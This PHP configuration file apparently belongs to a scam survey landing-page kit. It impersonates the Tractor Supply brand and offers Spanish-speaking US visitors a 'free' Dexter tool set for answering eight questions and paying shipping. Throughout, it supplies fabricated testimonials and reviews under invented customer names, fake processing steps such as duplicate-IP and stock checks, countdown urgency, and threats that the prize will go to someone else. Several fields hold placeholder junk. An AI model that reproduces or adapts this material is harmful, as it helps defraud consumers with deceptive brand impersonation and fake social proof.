<?php

// product
$product = "Juego de herramientas Dexter";
$description = "asdasd";
$price = "asdsad";
$productImage = "/templates/products/6e19da5dab9a643ee68f42c26c1753a2.png";
$commentImage1 = "/templates/products/eac0ae620a02d0d37efbcfb8e67f52ab.png";
$commentImage2 = "/templates/products/download.png";
$wallID = "asdasd";

// brand
$name = "Tractor Supply";
$brandLogo = "/templates/brands/tra_logo.png";
$favicon = "/templates/brands/tra_fav.png";
$backgroundImage = "/templates/brands/tra_bg.png";
$mainColor = "#E31937";
$secondaryColor = "#222";
$headerColor = "#fff";
$white = "true";

// geo
$geo = "us";
$langTag = "es";
$currency = "$";
$commentName1 = "Elizabeth Brown";
$commentName2 = "John Wilson";
$commentName3 = "Jennifer Jones";
$commentName4 = "Steven Jackson";
$commentName5 = "Dorothy Harris";
$profilePic1 = "/templates/geos/1_us.jpg";
$profilePic2 = "/templates/geos/2_us.jpg";
$profilePic3 = "/templates/geos/3_us.jpg";
$profilePic4 = "/templates/geos/4_us.jpg";
$profilePic5 = "/templates/geos/5_us.jpg";
$flagLogo = "/templates/geos/flaglogo_us.png";

// texts
$texts = [
    "tryetco" => [
        "title" => "Premios de la Encuesta",
        "text1" => "¡Más de $4,000,000 en ofertas entregadas hasta ahora!",
        "text2" => "Encuesta Sobre",
        "text3" => "Estimado comprador de Tractor Supply,",
        "text4" => "Nos gustaría ofrecerle una oportunidad única para recibir un nuevo",
        "text5" => "Para reclamarlo, simplemente complete esta breve encuesta sobre su experiencia con",
        "text6" => "¡Atención!",
        "text7" => "Esta oferta de encuesta expira hoy,",
        "text8" => "INICIAR ENCUESTA",
        "text9" => "Espere mientras procesamos sus respuestas...",
        "text10" => "Enviando respuestas...",
        "text11" => "Verificando si hay direcciones IP duplicadas...",
        "text12" => "Verificando nuestro inventario de productos...",
        "text13" => "¡Felicidades!",
        "text14" => "Respuestas enviadas",
        "text15" => "Dirección IP verificada",
        "text16" => "Productos disponibles en stock",
        "text17" => "¡Gracias por completar la encuesta!",
        "text18" => "Debido a que ayudó a proporcionar datos de consumo extremadamente valiosos, ahora puede elegir algunas de las siguientes recompensas exclusivas a continuación.",
        "text19" => "Tenga en cuenta que si abandona esta página sin reclamar su recompensa, no tenemos más remedio que darle a otro visitante la oportunidad de participar en nuestro programa de recompensas.",
        "text20" => "Precio:",
        "text21" => "Disponible en stock:",
        "text22" => "¡Pague solo por el envío!",
        "text23" => "RECLAMAR RECOMPENSA",
        "text24" => "Nuevo comentario",
        "text25" => "Comentarios (5)",
        "text26" => "Enviar",
        "text27" => "Recibí esto por correo electrónico y lo intenté. ¡Estoy emocionado de obtener mi recompensa! ¿Puedo enviarle la encuesta a mis amigos?",
        "text28" => "¡En realidad obtuve un premio de esta encuesta! Al principio, dudé, pero la intenté. ¡Y mira lo que acaba de llegar por correo!",
        "text29" => "¡Ja, qué encuesta tan genial, pero qué pena que no obtuve ningún premio!",
        "text30" => "Por lo general, no realizo este tipo de encuestas en línea, pero ¡esta es realmente buena! Usaremos este premio para un buen propósito, ¡muchas gracias!",
        "text31" => "¿Dónde puedo hacer más encuestas como esta? Me gusta obtener premios :)",
        "text32" => "Este sitio web no está afiliado ni avalado por Tractor Supply ni ninguna marca similar, y no pretende representar ni poseer ninguna de las marcas comerciales, nombres comerciales o derechos asociados a los productos que son propiedad de sus respectivos propietarios, quienes no poseen, avalan ni promocionan este sitio web.",
        "text33" => "*Los productos ofrecidos en la última página requieren cargos de envío y manipulación. Consulte el sitio del fabricante para obtener detalles, ya que los términos varían según las ofertas. Consulte los términos y condiciones importantes sobre esta encuesta, el sitio web y el anuncio.",
        "text34" => "*Importante: Pueden aplicarse costos de envío.",
        "text35" => "La oferta expira en",
        "text36" => "¡Felicidades!",
        "text37" => "Hemos reservado (1)",
        "text38" => "exclusivamente para usted.",
        "text39" => "Cómo reclamar tu",
        "text40" => "Complete su dirección de envío.",
        "text41" => "Pague solo los costos de envío para recibir su premio.",
        "text42" => "Su premio se entregará en 5-7 días hábiles.",
        "text43" => "Continuar",
        "like" => "Me gusta",
        "reply" => "Responder",
        "montharray" => "Enero, Febrero, Marzo, Abril, Mayo, Junio, Julio, Agosto, Septiembre, Octubre, Noviembre, Diciembre",
    ],
    "walp" => [
        "text1" => "Oferta exclusiva",
        "text4" => "INICIAR ENCUESTA",
        "surveyTitle" => "Ayúdanos a mejorar tu experiencia de compra",
        "question" => "Pregunta",
        "totalQuestions" => "8 preguntas en total",
        "text6" => "Procesando tu respuesta",
        "text7" => "Espere mientras verificamos su elegibilidad...",
        "text8" => "¡Felicidades!",
        "text10" => "STOCK LIMITADO",
        "text11" => "Precio regular:",
        "text12" => "Su precio:",
        "text13" => "Pague solo el envío y manipulación",
        "text14" => "Reclame su premio ahora",
        "text15" => "Oferta expira en:",
        "text16" => "Comentarios recientes:",
        "text17" => "Hace 2 horas",
        "verified" => "Verificado",
        "text18" => "Recibí esto por correo electrónico y lo intenté. ¡Estoy emocionado de obtener mi recompensa! ¿Puedo enviarle la encuesta a mis amigos?",
        "text19" => "Hace 8 horas",
        "text20" => "¡En realidad obtuve un premio de esta encuesta! Al principio, dudé, pero la intenté. ¡Y mira lo que acaba de llegar por correo!",
        "text21" => "Hace 1 día",
        "text22" => "¡Ja, qué encuesta tan genial, pero qué pena que no obtuve ningún premio!",
        "text23" => "Hace 1 día",
        "text24" => "Nuevo comentario!",
        "text25" => "Hace 1 día",
        "commentt" => "¿Dónde puedo hacer más encuestas como esta? ¡Me gusta obtener premios!",
        "text27" => "Política de privacidad",
        "text28" => "Términos de servicio",
        "text29" => "Contáctanos",
        "text31" => "*Importante: Pueden aplicarse costos de envío.",
        "title" => "Encuesta de clientes",
        "one" => "Respuestas enviadas",
        "two" => "Comprobando la dirección IP",
        "three" => "Comprobando la disponibilidad del producto",
        "four" => "Verificando la elegibilidad",
        "five" => "Preparando la recompensa",
        "send" => "Enviar",
        "questionCount1" => '',
        "questionCount2" => '',
        "questionCount3" => '',
        "questionCount4" => '',
        "questionCount5" => '',
        "questionCount6" => '',
        "questionCount7" => '',
        "questionCount8" => '',
        "text2" => "¡Gana un juego de herramientas Dexter!",
        "text5" => "Lo que dicen los clientes sobre este producto",
        "text3" => "Comparte tu experiencia de compra con Tractor Supply y obtén la oportunidad de ganar un juego de herramientas Dexter valorado en más de $asdsad.",
        "text9" => "Has sido seleccionado para recibir un juego de herramientas Dexter",
        "text30" => "Este sitio web no está afiliado ni avalado por Tractor Supply ni ninguna marca similar, y no pretende representar ni poseer ninguna de las marcas comerciales, nombres comerciales o derechos asociados a los productos que son propiedad de sus respectivos propietarios, quienes no poseen, avalan ni promocionan este sitio web. *Los productos ofrecidos en la última página requieren cargos de envío y manipulación. Consulte el sitio del fabricante para obtener detalles, ya que los términos varían según las ofertas. Consulte los términos y condiciones importantes sobre esta encuesta, el sitio web y el anuncio.",
        "feature1" => "Herramientas de alta calidad para todos tus proyectos de bricolaje.",
        "feature2" => "Construcción duradera y confiable para un uso duradero.",
        "feature3" => "Conjunto completo para una amplia gama de tareas.",
        "review1" => "Este juego de herramientas Dexter es fantástico. Las herramientas son de alta calidad y se sienten muy resistentes. Las he usado para algunos proyectos y se han mantenido en excelente estado. Una excelente relación calidad-precio.",
        "review2" => "Estoy muy impresionado con el juego de herramientas Dexter. La variedad de herramientas es perfecta para mis necesidades y todo está bien organizado. El montaje fue fácil y las herramientas son afiladas y precisas. ¡Muy recomendable!",
        "review3" => "Este juego de herramientas Dexter es exactamente lo que estaba buscando. Las herramientas son fáciles de usar y el diseño es inteligente. Me encanta lo compacto que es, ocupando un mínimo espacio en mi taller. Definitivamente una inversión valiosa.",
    ]
];


$survey = array(
    array("¿Con qué frecuencia visita Tractor Supply para sus necesidades de compra?", "Varias veces a la semana", "Una vez a la semana", "Algunas veces al mes", "Rara vez o nunca"),
    array("¿Qué impulsa principalmente su elección de comprar en Tractor Supply?", "Conveniencia de la ubicación", "Selección de productos", "Precios y ofertas", "Programa de recompensas de fidelización"),
    array("¿Cómo suele reaccionar cuando ve anuncios de Tractor Supply?", "Busco los artículos que necesito", "Miro si hay una buena oferta", "Considero visitar si hay una promoción", "Por lo general, ignoro los anuncios"),
    array("Si ganara un juego de herramientas Dexter de Tractor Supply, ¿cómo cambiaría su opinión sobre Tractor Supply?", "Significativamente más positivo", "Algo más positivo", "Sin cambios", "Más negativo"),
    array("En cuanto al juego de herramientas Dexter, ¿qué característica le resulta más atractiva?", "Durabilidad", "Versatilidad", "Portabilidad", "Diseño y apariencia"),
    array("¿Qué tan probable es que use un juego de herramientas Dexter si lo recibe de Tractor Supply?", "Muy probable", "Algo probable", "Poco probable", "No lo usaría"),
    array("En cuanto a suministros para exteriores y granjas, ¿cuán bien cree que Tractor Supply satisface sus necesidades?", "Supera mis necesidades", "Satisface bien mis necesidades", "Satisface adecuadamente mis necesidades", "No satisface mis necesidades"),
    array("¿Qué tan probable es que participe en futuras promociones o encuestas de Tractor Supply?", "Muy probable", "Algo probable", "No muy probable", "En absoluto probable"),
);

?>